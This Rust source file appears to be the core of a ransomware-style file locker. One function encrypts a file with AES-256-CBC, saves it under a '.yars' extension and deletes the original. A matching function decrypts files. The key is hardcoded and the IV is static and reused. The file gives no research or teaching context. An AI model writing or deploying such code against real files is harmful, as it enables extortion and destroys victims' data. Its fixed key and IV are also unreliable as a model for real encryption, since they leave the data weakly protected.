use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use std::fs::{File, remove_file};
use std::io::{Read, Write, Result};
use std::path::Path;
// use hex::{encode, decode};

// Define the type for AES-256-CBC
type Aes256Cbc = Cbc<Aes256, Pkcs7>;

const KEY: &[u8; 32] = b"verysecurekeyforaesthatissecret!"; // 32 bytes
const IV: &[u8; 16] = b"abcd1234abcd1234"; // 16 bytes

pub fn encrypt_file(input_path: &str) -> Result<()> {
    let output_path: String = input_path.to_owned() + ".yars";

    let mut file = File::open(input_path).expect("Cannot create file.");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    
    let cipher = Aes256Cbc::new_from_slices(KEY, IV).unwrap();

    let ciphertext = cipher.encrypt_vec(&buffer);
    let mut output_file = File::create(output_path.to_string())?;
    output_file.write_all(&ciphertext)?;

    remove_file(input_path)?;

    // println!("Encrypted data (hex): {}", encode(&ciphertext));

    Ok(())
}

pub fn decrypt_file(input_path: &str) -> Result<()> {
    let mut file = File::open(input_path)?;
    let mut buffer = Vec::new();

    let path: &Path = Path::new(input_path);
    let output_path = path.file_stem().unwrap();
    
    file.read_to_end(&mut buffer)?;

    let cipher = Aes256Cbc::new_from_slices(KEY, IV).unwrap();

    let decrypted_data = cipher.decrypt_vec(&buffer).expect("Decryption failed");

    let mut output_file = File::create(output_path)?;
    output_file.write_all(&decrypted_data)?;
    remove_file(input_path)?;

    // println!("Decrypted data: {}", String::from_utf8_lossy(&decrypted_data));

    Ok(())
}
